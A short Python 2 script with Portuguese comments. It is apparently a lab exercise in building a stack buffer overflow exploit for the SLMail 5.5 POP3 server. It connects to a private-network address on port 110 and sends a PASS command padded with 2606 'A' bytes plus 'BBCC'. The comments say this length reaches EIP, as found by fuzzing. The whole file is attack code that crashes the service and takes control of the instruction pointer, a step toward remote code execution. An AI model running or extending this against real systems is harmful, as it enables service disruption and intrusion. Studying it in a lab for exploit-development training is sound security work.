#!/usr/bin/python
import socket
bytes="A" * 2606 + "BBCC"  		#<-- Aqui deve ser colocado o valor onde o programa trava no fuzzing e ir dividindo ate encontrar o valor certo (forma manual)
					#2606 bytes foi o necessario para chegar ate o  EIP no SLMail 5.5
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.2.140",110))
	r = s.recv(1024)
	print r

	s.send("USER usuario\r\n")
	r = s.recv(1024)
	print r

	s.send("PASS "+bytes+"\r\n")
	r = s.recv(1024)
	print r

	s.send("QUIT\r\n")
	r = s.recv(1024)
	print r
except:
	print "Erro ao conectar"
